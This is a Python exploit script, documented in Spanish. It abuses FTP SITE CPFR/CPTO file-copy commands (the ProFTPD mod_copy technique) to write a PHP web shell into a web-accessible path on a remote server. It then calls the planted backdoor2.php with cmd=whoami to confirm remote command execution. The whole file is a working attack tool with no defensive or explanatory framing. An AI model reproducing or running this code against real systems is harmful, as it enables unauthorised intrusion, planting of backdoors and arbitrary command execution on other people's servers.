import socket
import requests

class Exploit:
    """Clase para gestionar la creación y ejecución de un exploit en un host remoto.

    Atributos:
        host (str): Dirección del servidor a explotar.
        port (int): Puerto de conexión al servidor.
        path (str): Ruta en el servidor donde se escribirá el archivo del exploit.
        sock (socket.socket): Objeto de socket utilizado para la conexión.

    """

    def __init__(self, host, port, path):
        """Inicializa la clase Exploit con los detalles del servidor objetivo.

        Args:
            host (str): Dirección IP o nombre de dominio del servidor objetivo.
            port (int): Puerto TCP en el cual se intentará establecer la conexión.
            path (str): Ruta en el servidor donde se depositará el payload del exploit.

        """
        self.host = host
        self.port = port
        self.path = path
        self.sock = None

    def connect(self):
        """Establece la conexión con el servidor utilizando un socket.

        Returns:
            bool: True si la conexión fue exitosa, False de lo contrario.

        """
        try:
            self.sock = socket.create_connection((self.host, self.port))
            self.sock.recv(1024)
            return True
        except Exception as e:
            print(f"Error al conectarse a {self.host} en el puerto {self.port}: {e}")
            return False
        
    def send_command(self, command):
        """Envía un comando específico al servidor a través del socket abierto.

        Args:
            command (str): El comando a enviar al servidor.

        Returns:
            str: La respuesta del servidor al comando enviado, o None si ocurre un error.

        """
        try:
            self.sock.sendall(command.encode('utf-8'))
            return self.sock.recv(1024).decode('utf-8')
        except Exception as e:
            print(f"Error al enviar el comando {command}: {e}")
            return None
        
    def exploit(self):
        """Realiza una serie de comandos para depositar y ejecutar el payload en el servidor.

        La función primero copia información del sistema al área temporal, luego
        coloca el payload y finalmente lo mueve a la ubicación especificada por `self.path`.
        Imprime el resultado de la operación.

        """
        payload = "<?php echo passthru($_GET['cmd']); ?>"
        self.send_command(f"site cpfr /proc/self/cmdline\n")
        self.send_command(f"site cpto /tmp/.{payload}\n")
        self.send_command(f"site cpfr /tmp/.{payload}\n")
        respuesta = self.send_command(f"site cpto {self.path}\n")

        if "Copy successful" in respuesta:
            print("La explotación ha tenido éxito.")
        else:
            print(f"La explotación ha fallado: {respuesta}")

    def trigger(self):
        """Intenta ejecutar el payload alojado en el servidor a través de una solicitud HTTP.

        Returns:
            str: El resultado de la ejecución del comando `whoami` a través del payload, o un mensaje de error.

        """
        try:
            response = requests.get(f"http://{self.host}/backdoor2.php?cmd=whoami")
            if response.status_code == 200:
                return response.text
            return f"Error al ejecutar el exploit: {response.text}"
        except Exception as e:
            return f"Error en la solicitud HTTP: {e}"

    def run(self):
        """Conecta al servidor y, si es exitoso, ejecuta el exploit."""
        if self.connect():
            self.exploit()